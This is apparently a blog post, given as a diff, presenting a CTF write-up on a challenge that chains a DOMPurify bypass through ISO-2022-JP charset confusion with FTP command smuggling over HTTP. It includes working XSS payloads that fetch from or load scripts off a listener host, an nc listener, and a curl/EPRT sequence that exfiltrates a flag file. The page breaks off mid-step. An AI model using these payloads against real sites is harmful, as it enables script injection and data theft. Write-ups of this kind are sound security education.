@@ -1,0 +1,258 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Writeup on a unique SSRF challenge in Reunion CTF 2026"><title>ReunionCTF 2026 Writeup - Confessions</title><link rel=canonical href=https://trinuro.github.io/p/reunionctf-2026-writeup-confessions/><link rel=stylesheet href=/scss/style.min.833d6eed45de56f48306bf57268d5b8cdfc8a60e8e7bdc99810464fcd033f7c6.css><meta property='og:title' content="ReunionCTF 2026 Writeup - Confessions"><meta property='og:description' content="Writeup on a unique SSRF challenge in Reunion CTF 2026"><meta property='og:url' content='https://trinuro.github.io/p/reunionctf-2026-writeup-confessions/'><meta property='og:site_name' content="Froginacup's site"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Ctf'><meta property='article:published_time' content='2026-01-17T19:20:49-05:00'><meta property='article:modified_time' content='2026-01-17T19:20:49-05:00'><meta name=twitter:title content="ReunionCTF 2026 Writeup - Confessions"><meta name=twitter:description content="Writeup on a unique SSRF challenge in Reunion CTF 2026"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_aff73beef7294c1a.jpg width=300 height=299 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>💡</span></figure><div class=site-meta><h1 class=site-name><a href=/>Froginacup's site</a></h1><h2 class=site-description>A place where Froginacup writes his adventures</h2></div></header><ol class=menu-social><li><a href=https://github.com/trinuro target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/projects-and-certificates/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Projects and Certificates</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctf-writeups/ style=background-color:#2a9d8f;color:#fff>CTF Writeups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/reunionctf-2026-writeup-confessions/>ReunionCTF 2026 Writeup - Confessions</a></h2><h3 class=article-subtitle>Writeup on a unique SSRF challenge in Reunion CTF 2026</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-01-17T19:20:49-05:00>Jan 17, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><ol><li>Firefox will interpret a HTTP response as having <a class=link href=https://www.rfc-editor.org/rfc/rfc1468.html target=_blank rel=noopener><code>ISO-2022-JP</code></a> encoding if it contains the bytes <a class=link href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/#:~:text=A%20single%20occurrence%20of%20one%20of%20these%20escape%20sequences%20is%20usually%20enough%20to%20convince%20the%20auto%2Ddetection%20algorithm%20that%20the%20HTTP%20response%20body%20is%20encoded%20with%20ISO%2D2022%2DJP." target=_blank rel=noopener><code>%1b%28%4a</code></a></li><li>To confirm that Firefox interprets the page as ISO-2022-JP encoding, send a request like the one below.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/save</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>127.0.0.1:3000</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=g>content=%1b%28%4a%5c
+</span></span></span></code></pre></td></tr></table></div></div><ul><li><code>%1b%28%4a</code>: The bytes after this are JIS X 0201-1976 encoded</li><li><code>%5c</code>: Normally, it is <code>\</code>, but it is the Yen symbol in JIS X 0201-1976 code.
+Output (Firefox):
+<img src=/p/reunionctf-2026-writeup-confessions/confessions-1.png width=2376 height=932 srcset="/p/reunionctf-2026-writeup-confessions/confessions-1_hu_51ad005851150c20.png 480w, /p/reunionctf-2026-writeup-confessions/confessions-1_hu_350bd48d2c57df68.png 1024w" loading=lazy alt=confessions-1.png class=gallery-image data-flex-grow=254 data-flex-basis=611px>
+We can also press Control+I to open page info and view the text encoding.
+<img src=/p/reunionctf-2026-writeup-confessions/confessions-2.png width=1081 height=794 srcset="/p/reunionctf-2026-writeup-confessions/confessions-2_hu_9067722e9c781059.png 480w, /p/reunionctf-2026-writeup-confessions/confessions-2_hu_76a25357f85d38a2.png 1024w" loading=lazy alt=confessions-2.png class=gallery-image data-flex-grow=136 data-flex-basis=326px></li></ul><ol start=3><li>This is an <a class=link href=https://gist.github.com/kevin-mizu/9b24a66f9cb20df6bbc25cc68faf3d71 target=_blank rel=noopener>example</a> of Dompurify bypass using ISO-2022-JP encoding</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>createDOMPurify</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;dompurify&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>JSDOM</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;jsdom&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>http</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;http&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>server</span> <span class=o>=</span> <span class=nx>http</span><span class=p>.</span><span class=nx>createServer</span><span class=p>((</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nb>window</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>JSDOM</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>).</span><span class=nb>window</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>DOMPurify</span> <span class=o>=</span> <span class=nx>createDOMPurify</span><span class=p>(</span><span class=nb>window</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>clean</span> <span class=o>=</span> <span class=nx>DOMPurify</span><span class=p>.</span><span class=nx>sanitize</span><span class=p>(</span><span class=sb>`&lt;a id=&#34;\x1b$B&#34;&gt;&lt;/a&gt;\x1b(B&lt;a id=&#34;&gt;&lt;img src=x onerror=alert(1)&gt;&#34;&gt;&lt;/a&gt;`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>statusCode</span> <span class=o>=</span> <span class=mi>200</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>setHeader</span><span class=p>(</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>,</span> <span class=s2>&#34;text/html&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>(</span><span class=nx>clean</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>PORT</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>PORT</span> <span class=o>||</span> <span class=mi>4000</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>server</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>PORT</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Server is running on port </span><span class=si>${</span><span class=nx>PORT</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>It is really clever. <code>&lt;a id=">&lt;img src=x onerror=alert(1)>">&lt;/a></code> by itself does not trigger an XSS. However, by converting <code>B">&lt;/a>\x1</code> into the Japanese encoding, we can remove <code>"</code> from the first <code>&lt;a></code></li></ul><ol start=4><li>To get the victim&rsquo;s browser to connect to the attacker server,</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/save</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>127.0.0.1:3000</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=g>content=&lt;a+id%3d&#34;%1b$B&#34;&gt;&lt;/a&gt;%1b(B&lt;a+id%3d&#34;&gt;&lt;img+src%3dx+onerror%3dfetch(&#39;http%3a//172.21.0.1%3a9999&#39;)&gt;&#34;&gt;&lt;/a&gt;
+</span></span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nc -lvnp 9999
+</span></span><span class=line><span class=cl>listening on [any] 9999 ...
+</span></span><span class=line><span class=cl>connect to [172.21.0.1] from (UNKNOWN) [192.168.248.138] 38586
+</span></span><span class=line><span class=cl>GET / HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 172.21.0.1:9999
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+</span></span><span class=line><span class=cl>Accept: */*
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate, br
+</span></span><span class=line><span class=cl>Referer: http://127.0.0.1:3000/
+</span></span><span class=line><span class=cl>Origin: http://127.0.0.1:3000
+</span></span><span class=line><span class=cl>Connection: keep-alive
+</span></span><span class=line><span class=cl>Priority: u=4
+</span></span></code></pre></td></tr></table></div></div><ul><li>Cool!</li></ul><ol start=5><li>We can make the server load any JavaScript file we want.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/save</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>127.0.0.1:3000</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=g>content=&lt;a+id%3d&#34;%1b$B&#34;&gt;&lt;/a&gt;%1b(B&lt;a+id%3d&#34;&gt;&lt;script+src=http://172.21.0.1:9999/poc.js&gt;&lt;/script&gt;&#34;&gt;&lt;/a&gt;
+</span></span></span></code></pre></td></tr></table></div></div><p>Let poc.js be</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>print()
+</span></span></code></pre></td></tr></table></div></div><p>Output:
+<img src=/p/reunionctf-2026-writeup-confessions/confessions-3.png.png width=1852 height=1170 srcset="/p/reunionctf-2026-writeup-confessions/confessions-3.png_hu_e131242be0e5b81d.png 480w, /p/reunionctf-2026-writeup-confessions/confessions-3.png_hu_f882cac9cec63853.png 1024w" loading=lazy alt=confessions-3.png.png class=gallery-image data-flex-grow=158 data-flex-basis=379px>
+6. The flag is stored in the FTP server as <code>flag.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>export</span> <span class=kr>const</span> <span class=nx>setFlag</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>client</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Client</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=nx>client</span><span class=p>.</span><span class=nx>ftp</span><span class=p>.</span><span class=nx>verbose</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>client</span><span class=p>.</span><span class=nx>access</span><span class=p>({</span>
+</span></span><span class=line><span class=cl>            <span class=nx>host</span><span class=o>:</span> <span class=s2>&#34;db&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nx>user</span><span class=o>:</span> <span class=s2>&#34;ftp&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nx>password</span><span class=o>:</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>FTP_PASSWORD</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nx>port</span><span class=o>:</span> <span class=mi>2121</span>
+</span></span><span class=line><span class=cl>        <span class=p>});</span>
+</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>flagStream</span> <span class=o>=</span> <span class=nx>Readable</span><span class=p>.</span><span class=nx>from</span><span class=p>([</span><span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>FLAG</span> <span class=o>||</span> <span class=s2>&#34;RE:CTF{fakeflag}&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>client</span><span class=p>.</span><span class=nx>uploadFrom</span><span class=p>(</span><span class=nx>flagStream</span><span class=p>,</span> <span class=s2>&#34;flag.txt&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Flag setup complete&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nx>client</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span></code></pre></td></tr></table></div></div><p>Anonymous login is allowed.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Define a new user having full r/w permissions and a read-only</span>
+</span></span><span class=line><span class=cl><span class=c1># anonymous user</span>
+</span></span><span class=line><span class=cl><span class=n>WORKING_DIRECTORY</span> <span class=o>=</span> <span class=s1>&#39;/app/data&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>authorizer</span><span class=o>.</span><span class=n>add_user</span><span class=p>(</span><span class=s1>&#39;ftp&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s1>&#39;ADMIN_FTP_PASSWORD&#39;</span><span class=p>),</span> <span class=n>WORKING_DIRECTORY</span><span class=p>,</span> <span class=n>perm</span><span class=o>=</span><span class=s1>&#39;elradfmwMT&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>authorizer</span><span class=o>.</span><span class=n>add_anonymous</span><span class=p>(</span><span class=n>WORKING_DIRECTORY</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=7><li>We can retrieve flag from the FTP server like this
+Open a port to listen for connections</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nc -lvnp 9999
+</span></span></code></pre></td></tr></table></div></div><p>Send these commands to the server</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>USER anonymous
+</span></span><span class=line><span class=cl>PASS 
+</span></span><span class=line><span class=cl>EPRT |1|172.21.0.1|9999|
+</span></span><span class=line><span class=cl>RETR flag.txt
+</span></span><span class=line><span class=cl>QUIT
+</span></span></code></pre></td></tr></table></div></div><ul><li>Referred: <a class=link href=https://ctftime.org/writeup/29641 target=_blank rel=noopener>https://ctftime.org/writeup/29641</a> and <a class=link href=https://datatracker.ietf.org/doc/html/rfc2428#section-2 target=_blank rel=noopener>https://datatracker.ietf.org/doc/html/rfc2428#section-2</a>
+Output:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RE:CTF{fakeflag}
+</span></span></code></pre></td></tr></table></div></div><ol start=8><li>We can use HTTP to interact with FTP server as long as we have line feeds to separate each command.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>echo &#34;USER anonymous\r\nPASS \r\nEPRT |1|172.21.0.1|9999|\r\nRETR flag.txt\r\n\r\n&#34; &gt; exploit.txt
+</span></span><span class=line><span class=cl>curl http://172.21.0.2:2121 -F file=@exploit.txt -v --http0.9
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>*</span> <span class=n>upload</span> <span class=n>completely</span> <span class=n>sent</span> <span class=n>off</span><span class=p>:</span> <span class=mi>268</span> <span class=n>bytes</span>
+</span></span><span class=line><span class=cl><span class=mi>220</span> <span class=n>pyftpdlib</span> <span class=n>based</span> <span class=n>FTP</span> <span class=n>server</span> <span class=n>ready</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;POST&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;HOST:&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;USER-AGENT:&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;ACCEPT:&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;CONTENT-LENGTH:&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;CONTENT-TYPE:&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;--------------------------B2RKR7KWUXQRYGP9ALKGOC&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;CONTENT-DISPOSITION:&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;CONTENT-TYPE:&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>331</span> <span class=n>Username</span> <span class=n>ok</span><span class=p>,</span> <span class=n>send</span> <span class=n>password</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>230</span> <span class=n>Login</span> <span class=n>successful</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>150</span> <span class=ne>File</span> <span class=n>status</span> <span class=n>okay</span><span class=o>.</span> <span class=n>About</span> <span class=n>to</span> <span class=n>open</span> <span class=n>data</span> <span class=n>connection</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34; not understood.</span>
+</span></span><span class=line><span class=cl><span class=mi>500</span> <span class=n>Command</span> <span class=s2>&#34;--------------------------B2RKR7KWUXQRYGP9ALKGOC--&#34;</span> <span class=ow>not</span> <span class=n>understood</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>200</span> <span class=n>Active</span> <span class=n>data</span> <span class=n>connection</span> <span class=n>established</span><span class=o>.</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=9><li>Let&rsquo;s try to request using JavaScript. <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/FormData/FormData target=_blank rel=noopener>FormData</a> is used so that we can use <code>multipart/form-data</code>.
